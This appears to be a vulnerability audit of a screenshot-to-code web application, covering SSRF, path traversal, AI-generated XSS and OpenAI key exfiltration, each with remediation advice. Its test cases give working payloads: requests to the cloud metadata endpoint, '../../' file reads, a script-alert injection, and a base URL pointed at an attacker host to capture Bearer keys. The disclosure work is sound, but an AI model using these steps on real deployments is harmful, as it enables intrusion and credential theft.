## VULNERABILITIES

### 1. Server-Side Request Forgery (SSRF) via Screenshot API

*   **Vulnerability Name**: Server-Side Request Forgery (SSRF) via Screenshot API
*   **Description**:
    The application provides an endpoint `/api/screenshot` which takes a `url` parameter from the user and uses it to capture a screenshot via an external API (`https://api.screenshotone.com`). The `normalize_url` function attempts to ensure a valid protocol (defaults to `https://`) but does not implement any allow-list or deny-list to restrict the target host. An external attacker can provide an arbitrary internal URL (e.g., `http://localhost:7001` to target the backend itself, or internal network IPs like `192.168.1.1`, or cloud metadata endpoints like `http://169.254.169.254`). The application's backend will then make a request to the attacker-supplied internal URL via the `screenshotone.com` service. While `screenshotone.com` might have its own internal mitigations, the application itself is initiating the request based on user input, creating an SSRF vulnerability.
*   **Impact**:
    An attacker can use this vulnerability to probe the internal network of the server hosting the application, discover internal services, access sensitive internal resources, or potentially exfiltrate cloud metadata (e.g., AWS IAM credentials if the application is hosted on AWS EC2 without proper IMDSv2 configuration or if IMDSv1 is available). This could lead to further compromise of the application's infrastructure.
*   **Vulnerability Rank**: High
*   **Currently Implemented Mitigations**:
    The `normalize_url` function (in `backend/routes/screenshot.py`) attempts to ensure the URL has a valid protocol (`http://` or `https://`) and defaults to `https://` if no scheme is provided. It raises a `ValueError` for unsupported explicit protocols. However, this only addresses URL formatting and does not prevent requests to internal IP addresses or sensitive domains. **Crucially, the unit tests (`backend/tests/test_screenshot.py`) explicitly confirm that `normalize_url` is designed to accept `localhost` and private IP addresses as valid inputs, demonstrating that the application's logic permits these internal targets.** The application relies on the external `screenshotone.com` API for the actual screenshot capture, and any filtering done by that third-party service is outside the direct control or mitigation within the project's codebase.
*   **Missing Mitigations**:
    The application should implement a strict allow-list for domains that can be screenshotted or a robust deny-list for internal IP ranges and sensitive domains (e.g., `localhost`, `127.0.0.1`, `169.254.169.254`, `0.0.0.0`, private IP ranges). Additionally, network egress filtering on the server level could prevent the application from making requests to internal IPs.
*   **Preconditions**:
    The attacker has network access to the application's `/api/screenshot` endpoint. The server-side environment allows outbound requests to arbitrary external URLs (which `screenshotone.com` would then use to fetch the attacker's target URL).
*   **Source Code Analysis**:
    1.  **`backend/routes/screenshot.py`**: The `app_screenshot` endpoint is defined as a `POST` request at `/api/screenshot`.
    2.  It receives a `ScreenshotRequest` Pydantic model, which includes `url` and `apiKey`.
    3.  Line 43: `normalized_url = normalize_url(url)` calls the `normalize_url` function.
    4.  The `normalize_url` function (lines 14-34) primarily ensures a `https://` prefix if no scheme is present and raises an error for unsupported schemes. It does not perform any host-based validation.
    5.  **`backend/tests/test_screenshot.py`**: This test file explicitly validates that `normalize_url` accepts internal IP addresses and `localhost`.
        *   `test_localhost_urls` includes: `assert normalize_url("localhost") == "https://localhost"` and `assert normalize_url("http://localhost:8080") == "http://localhost:8080"`.
        *   `test_ip_address_urls` includes: `assert normalize_url("192.168.1.1") == "https://192.168.1.1"` and `assert normalize_url("http://192.168.1.1") == "http://192.168.1.1"`.
        These tests confirm that the function's intended behavior is to allow such internal targets.
    6.  Line 46 (`backend/routes/screenshot.py`): `image_bytes = await capture_screenshot(normalized_url, api_key=api_key)` calls the `capture_screenshot` function.
    7.  The `capture_screenshot` function (lines 37-60) constructs a request to `https://api.screenshotone.com/take` using `httpx.AsyncClient`.
    8.  Line 42: `params = {"access_key": api_key, "url": target_url, ...}` includes the user-controlled `target_url` directly in the parameters sent to the external screenshot service.
    9.  Therefore, an attacker can specify `target_url` as an internal IP or hostname, and the backend will instruct the external service to make a request to that internal resource, and the response (or an indication of success/failure) could be observed.
*   **Security Test Case**:
    1.  **Objective**: Prove that the application can be tricked into making requests to internal network resources.
    2.  **Setup**: Ensure the application is running and accessible externally. Identify a known internal IP address or hostname that the application server can reach (e.g., if it's running in Docker, `http://host.docker.internal` or `http://localhost` from the container's perspective).
    3.  **Step 1**: Send a `POST` request to `http://<APP_HOST>:<APP_PORT>/api/screenshot` with a malicious `url` parameter.
        *   **Request Body**:
            ```json
            {
              "url": "http://localhost:7001",
              "apiKey": "dummy_api_key"
            }
            ```
            (Replace `dummy_api_key` with any non-empty string as it's required by the Pydantic model, but its value is not relevant for this test if `screenshotone.com` API allows any key for local testing or if the goal is to see if the internal request is made).
        *   **Expected Behavior**: The application backend should attempt to request a screenshot of `http://localhost:7001` via the `screenshotone.com` API.
        *   **Observation**: Check the server logs of the `screenshot-to-code` backend. If the `screenshotone.com` API attempts to access `http://localhost:7001`, the backend's `/` endpoint (which returns "Your backend is running correctly...") might show an access log, or the screenshot API might return an error indicating it couldn't reach the target, or even return a screenshot of the backend's status page.
    4.  **Step 2 (Advanced)**: If the application is hosted in a cloud environment (e.g., AWS EC2), attempt to retrieve cloud metadata.
        *   **Request Body**:
            ```json
            {
              "url": "http://169.254.169.254/latest/meta-data/",
              "apiKey": "dummy_api_key"
            }
            ```
        *   **Expected Behavior**: The `screenshotone.com` API would attempt to fetch the metadata.
        *   **Observation**: The response from the `/api/screenshot` endpoint might contain an error or partial data from the metadata service if the external screenshot service leaks such information or if the screenshot itself captures the metadata page.

### 2. Unauthenticated Path Traversal & Arbitrary File Read in Evaluation Endpoints

*   **Vulnerability Name**: Unauthenticated Path Traversal & Arbitrary File Read in Evaluation Endpoints
*   **Description**:
    The application exposes several endpoints under `/evals` (e.g., `/eval_input_files`, `/evals`, `/pairwise-evals`, `/run_evals`, `/best-of-n-evals`, `/output_folders`) that are intended for evaluating AI models. These endpoints are not protected by any authentication or authorization mechanisms. Furthermore, some of these endpoints accept user-controlled file paths (e.g., `folder`, `folder1`, `folder2`, `files`). An external attacker can manipulate these path parameters using `../` sequences to traverse directories outside the intended `EVALS_DIR` and read arbitrary files on the server's file system.
*   **Impact**:
    A malicious actor can read sensitive files (e.g., `/etc/passwd`, `/etc/shadow`, application configuration files, API keys stored in `.env` files, source code). This information disclosure can lead to further exploitation, including privilege escalation, access to other accounts, or compromising the application's functionality. Since the `run_evals` endpoint can be triggered, an attacker could also attempt to read arbitrary files and pass their content to an LLM, potentially exfiltrating data indirectly.
*   **Vulnerability Rank**: Critical
*   **Currently Implemented Mitigations**:
    No authentication or authorization is implemented for these evaluation endpoints. Path parameters are converted to `pathlib.Path` objects but no explicit sanitization or canonicalization (e.g., using `pathlib.Path.resolve()` with `strict=True` or checking for `os.path.commonpath`) is performed to prevent directory traversal attacks.
*   **Missing Mitigations**:
    1.  Implement robust authentication and authorization for all `/evals` endpoints, restricting access to authorized users (e.g., administrators).
    2.  Sanitize all user-supplied file paths to prevent directory traversal. This can be done by validating that the canonicalized path remains within the allowed `EVALS_DIR` (e.g., using `os.path.abspath` and `os.path.commonpath`, or `pathlib.Path.resolve()` and checking `is_relative_to`).
    3.  Implement least privilege principles for the application's file system access.
*   **Preconditions**:
    The application is running and the `/evals` endpoints are publicly accessible without authentication.
*   **Source Code Analysis**:
    1.  **`backend/main.py`**: The `evals.router` is included without any middleware for authentication.
    2.  **`backend/routes/evals.py`**:
        *   Line 31: `@router.get("/evals", response_model=list[Eval])` and Line 32: `async def get_evals(folder: str):`
        *   Line 35: `folder_path = Path(folder)` converts the user-supplied `folder` string directly into a `Path` object. No sanitization is applied.
        *   Line 41: `files = {f: os.path.join(folder, f) for f in os.listdir(folder) if f.endswith(".html")}` lists files within the user-controlled `folder`. This can be exploited to list arbitrary directories.
        *   Line 53: `input_path = os.path.join(EVALS_DIR, "inputs", f"{base_name}.png")` attempts to read an input image. If `base_name` is derived from an attacker-controlled path, this could be used to read arbitrary files if the attacker can control the `base_name`.
        *   Line 60: `with open(output_file, "r", encoding="utf-8") as f:` attempts to read the content of `output_file`, which is constructed using the user-controlled `folder`.
        *   The `get_pairwise_evals` and `get_best_of_n_evals` endpoints similarly take `folder` parameters without sanitization.
        *   The `run_evals` endpoint (lines 142-152) takes an optional `files: List[str]` parameter.
        *   Line 149: `output_files = await run_image_evals(model=model, stack=request.stack, input_files=request.files)` passes user-supplied file paths directly to `run_image_evals`.
    3.  **`backend/evals/runner.py`**:
        *   Line 56: `if os.path.isabs(original_filename): filepath = original_filename`. This explicitly allows absolute paths for `input_files`, making path traversal straightforward.
        *   Line 60: `data_url = await image_to_data_url(filepath)` reads the content of the file.
        *   The content is then passed to LLMs.
*   **Security Test Case**:
    1.  **Objective**: Read the `pyproject.toml` file of the backend application, which is outside the `EVALS_DIR`.
    2.  **Setup**: Ensure the application is running and accessible externally.
    3.  **Step 1**: Attempt to list a directory outside the intended `EVALS_DIR`.
        *   **Request**: `GET http://<APP_HOST>:<APP_PORT>/evals?folder=../../`
        *   **Expected Behavior**: The API should return a 403 Forbidden or 404 Not Found, or an error indicating path validation failure.
        *   **Observed Behavior (Vulnerable)**: The API might return a 500 Internal Server Error due to `os.listdir` on a non-directory, or if the path is valid, it might list directories at the root level of the Docker container.
    4.  **Step 2**: Attempt to read the `pyproject.toml` file using the `run_evals` endpoint.
        *   **Request**: `POST http://<APP_HOST>:<APP_PORT>/run_evals`
        *   **Request Body**:
            ```json
            {
              "models": ["gpt-4o-2024-05-13"],
              "stack": "html_tailwind",
              "files": ["../../pyproject.toml"]
            }
            ```
        *   **Expected Behavior**: The API should reject the request due to an invalid file path or lack of authorization.
        *   **Observed Behavior (Vulnerable)**: The `run_image_evals` function in `evals/runner.py` would call `image_to_data_url` on `../../pyproject.toml`. This function (in `backend/evals/utils.py`) attempts to read the file as an image. If successful, the content of `pyproject.toml` would be base64 encoded and passed to the LLM as an "image". While the LLM might not interpret it correctly as an image, the vulnerability is in the arbitrary file read and the ability to exfiltrate its content (e.g., by observing the LLM's response or error, or if the LLM includes the content in its "thinking" output that is logged). A more direct exfiltration could be possible if the file is small enough to fit within an error message or a truncated log.

### 3. Cross-Site Scripting (XSS) via AI-Generated Code

*   **Vulnerability Name**: Cross-Site Scripting (XSS) via AI-Generated Code
*   **Description**:
    The core functionality of the application is to generate code (HTML, CSS, JavaScript) from user inputs (screenshots, text prompts, video). This generated code is then rendered directly in the frontend preview and also used in the `/evals` UI for side-by-side comparison. If a malicious user can craft an input (e.g., a specific image, text prompt, or video) that causes the AI model to generate HTML/JavaScript containing an XSS payload, this payload could execute in the browser of anyone viewing the generated code. This is a stored XSS vulnerability because the generated code can be saved (implicitly via the evaluation system's output folders) and viewed later by other users or administrators.
*   **Impact**:
    An attacker could execute arbitrary JavaScript in the context of the user's browser viewing the malicious output. This could lead to session hijacking, defacement, phishing, or other client-side attacks. For instance, if an administrator views the evaluation results of a malicious prompt, their session could be compromised.
*   **Vulnerability Rank**: High
*   **Currently Implemented Mitigations**:
    The application does not appear to implement any explicit sanitization or sandboxing (e.g., using iframes with `sandbox` attribute) for the AI-generated HTML/JavaScript before rendering it in the preview or evaluation interfaces. The `extract_html_content` function (in `backend/codegen/utils.py`) only extracts HTML tags and does not sanitize the content itself.
*   **Missing Mitigations**:
    1.  Implement robust HTML sanitization of all AI-generated code before rendering it in the frontend preview and evaluation interfaces. This should remove or encode potentially malicious tags and attributes (e.g., `<script>`, `onerror`, `onload`).
    2.  Consider rendering AI-generated code within a sandboxed `<iframe>` element with strict `sandbox` attributes to isolate it from the main application's origin.
    3.  Implement Content Security Policy (CSP) headers to restrict the types of content that can be loaded and executed by the browser, mitigating some XSS vectors.
*   **Preconditions**:
    An attacker can interact with the AI model to generate code. The generated code is rendered in a browser without sufficient sanitization or sandboxing.
*   **Source Code Analysis**:
    1.  **`backend/routes/generate_code.py`**:
        *   Line 333: `await self.send_message("setCode", processed_html, index)` sends the `processed_html` (which is the AI-generated code, potentially after image generation) directly to the frontend via WebSocket.
        *   Line 329: `processed_html = extract_html_content(processed_html)` calls a utility function that merely extracts HTML content but does not sanitize it.
    2.  **`backend/prompts/prompts.py`**: This module, as shown by `backend/tests/test_prompts.py` and `backend/tests/test_prompts_additional.py`, is responsible for assembling the messages sent to the LLM. It takes user-controlled `prompt.text`, `prompt.images` (base64 encoded images), and `history` (which can contain `text` and `images`) and directly incorporates them into the LLM's input messages.
        *   The `test_image_mode_create_single_image` and `test_text_mode_create_generation` tests confirm that user-provided text descriptions and image URLs are directly included in the LLM's user prompt.
        *   The `test_video_mode_basic_prompt_creation` (in `backend/tests/test_prompts.py`) and `backend/video/utils.py` demonstrate that user-supplied video is split into frames, base64 encoded, and then included in the LLM's prompt.
        *   This direct inclusion means an attacker can craft inputs (image, text, video) that guide the LLM to generate malicious HTML.
    3.  **`backend/evals/runner.py`**:
        *   Line 104: `with open(output_html_filepath, "w") as file: file.write(generated_content)` saves the raw AI-generated HTML to a file.
    4.  **`backend/routes/evals.py`**:
        *   Line 62: `with open(output_file, "r", encoding="utf-8") as f: output_html = f.read()` reads saved generated HTML.
        *   Line 63: `evals.append(Eval(input=input_data, outputs=[output_html]))` passes this `output_html` to the frontend for display in the evaluation UI.
    5.  **Frontend (conceptual, based on README and design docs)**: The frontend (React/Vite) receives this code and renders it in the preview pane and the `/evals` page. Without explicit sanitization on the frontend (which is not visible in the provided backend files but is a common pattern for such applications), the generated code will be directly injected into the DOM.
*   **Security Test Case**:
    1.  **Objective**: Demonstrate that malicious JavaScript can be executed in the browser by an AI-generated code.
    2.  **Setup**: Ensure the application is running and accessible externally.
    3.  **Step 1**: Craft a text prompt (or use an image/video that would lead to a similar output) designed to induce the AI model to generate an XSS payload. For example, a prompt like: "Generate a simple HTML page with a button that, when clicked, executes `alert('XSS by AI');`."
    4.  **Step 2**: Use the application's interface to submit this prompt for code generation (e.g., via the "text" input mode if available, or an image/video that implies such functionality).
    5.  **Step 3**: Once the code is generated and displayed in the live preview pane, interact with the generated button (if any).
    6.  **Expected Behavior**: The `alert('XSS by AI');` dialog should appear, demonstrating successful XSS.
    7.  **Step 4 (Stored XSS)**: If the generated code is saved as part of an evaluation run (e.g., by using the `run_evals` endpoint with a prompt that produces XSS) and then viewed in the `/evals` UI by another user, the XSS payload should execute in that user's browser.
        *   **Request (example for Step 4)**:
            *   A more direct test for stored XSS would be to manually create an HTML file in `backend/evals_data/outputs/<some_folder>/xss_test_0.html` with an XSS payload and then navigate to the `/evals` UI to view it.
            *   **Content of `xss_test_0.html`**:
                ```html
                <html><body><script>alert('Stored XSS from Eval!');</script></body></html>
                ```
            *   **Request to view**: `GET http://<APP_HOST>:<APP_PORT>/evals?folder=backend/evals_data/outputs/<some_folder>`
            *   **Expected Behavior**: The `alert` dialog should pop up when the eval output is rendered in the browser.

### 4. Server-Side Request Forgery (SSRF) / API Key Exfiltration via User-Controlled OpenAI Base URL (Non-Prod)

*   **Vulnerability Name**: Server-Side Request Forgery (SSRF) / API Key Exfiltration via User-Controlled OpenAI Base URL (Non-Prod)
*   **Description**:
    The application allows users to configure the `OPENAI_BASE_URL` via the settings dialog in the frontend. This parameter is then passed to the backend and used by the `AsyncOpenAI` client. While the `IS_PROD` flag is intended to disable this in production, the `docker-compose.yml` file does not set `IS_PROD=True`, meaning it defaults to `False` as per `backend/config.py`. Therefore, in a publicly deployed instance using the provided Docker setup, an external attacker can set `openai_base_url` to a malicious server they control. When the application then attempts to make an OpenAI API call, it will send the user's OpenAI API key (which is also passed from the frontend) to the attacker's server, leading to API key exfiltration. This also constitutes an SSRF, as the backend will make an arbitrary HTTP request to a user-controlled endpoint.
*   **Impact**:
    An attacker can steal the OpenAI API keys of users interacting with the application. This allows them to make unauthorized API calls, potentially incurring costs for the victim, accessing their OpenAI account, or exhausting their quotas. Additionally, the ability to control the `base_url` allows for SSRF, enabling the attacker to probe internal networks or interact with internal services from the application's backend.
*   **Vulnerability Rank**: High
*   **Currently Implemented Mitigations**:
    The code has a check (`if not IS_PROD:`) to disable user-specified `openai_base_url` in production environments. However, the default `IS_PROD` value in `backend/config.py` is `False`, and the provided `docker-compose.yml` does not override this to `True`. This means the mitigation is not active in a default Docker deployment, making the vulnerability present.
*   **Missing Mitigations**:
    1.  Ensure that `IS_PROD` is explicitly set to `True` in production deployments (e.g., in `docker-compose.yml` or the production deployment script).
    2.  Implement server-side validation for `openai_base_url` even in non-production environments to restrict it to a predefined allow-list of trusted OpenAI API endpoints, or at least deny internal IP addresses.
    3.  Consider a design where API keys are never directly sent from the frontend to the backend or are stored in a secure vault, and only used by a trusted backend service.
*   **Preconditions**:
    The application is running in a non-production configuration (i.e., `IS_PROD` is `False`). The attacker has network access to the application's WebSocket endpoint for code generation. The user has provided their OpenAI API key to the application.
*   **Source Code Analysis**:
    1.  **`backend/config.py`**: Line 24: `IS_PROD = os.environ.get("IS_PROD", False)` sets `IS_PROD` to `False` by default if the environment variable is not set.
    2.  **`docker-compose.yml`**: The `backend` service definition does not set the `IS_PROD` environment variable, thus it defaults to `False`.
    3.  **`backend/routes/generate_code.py`**:
        *   Line 223: `openai_base_url: str | None = None`
        *   Line 225: `if not IS_PROD: openai_base_url = self._get_from_settings_dialog_or_env(params, "openAiBaseURL", OPENAI_BASE_URL)`
        *   This block allows the `openAiBaseURL` to be extracted from `params` (user-controlled settings dialog) if `IS_PROD` is `False`.
        *   Line 411: `return await stream_openai_response(..., base_url=self.openai_base_url, ...)` passes this user-controlled `base_url` to the `stream_openai_response` function.
    4.  **`backend/models/openai_client.py`**:
        *   Line 12: `client = AsyncOpenAI(api_key=api_key, base_url=base_url)` creates an OpenAI client. The `api_key` (also from user input/env var) and the user-controlled `base_url` are used directly.
        *   This means the `AsyncOpenAI` client will attempt to connect to the attacker-controlled `base_url` and send the `api_key` in the `Authorization` header.
*   **Security Test Case**:
    1.  **Objective**: Exfiltrate an OpenAI API key by pointing the `openai_base_url` to an attacker-controlled server.
    2.  **Setup**:
        *   Ensure the application is running in its default Docker setup (where `IS_PROD` is `False`).
        *   Set up a simple HTTP server (e.g., using Python's `http.server` or `netcat`) on a publicly accessible IP address that the application server can reach. This server should log all incoming requests, especially headers.
        *   Obtain a valid OpenAI API key to provide to the application.
    3.  **Step 1**: Access the frontend of the application (e.g., `http://localhost:5173`).
    4.  **Step 2**: Open the settings dialog (gear icon) and input the OpenAI API key.
    5.  **Step 3**: In the `OpenAI Base URL` field, enter the URL of your attacker-controlled HTTP server (e.g., `http://<ATTACKER_IP>:<ATTACKER_PORT>/v1`). The `/v1` suffix is important as the client expects it.
    6.  **Step 4**: Initiate a code generation request (e.g., upload a screenshot and click "Generate").
    7.  **Expected Behavior**: The application's backend should attempt to make a request to the attacker's server, including the OpenAI API key in the `Authorization` header or as part of the request body.
    8.  **Observation**: On the attacker-controlled HTTP server, you should observe an incoming request from the application's backend. Inspect the request headers and body for the OpenAI API key. The key will typically be in the `Authorization` header as `Bearer sk-...`.
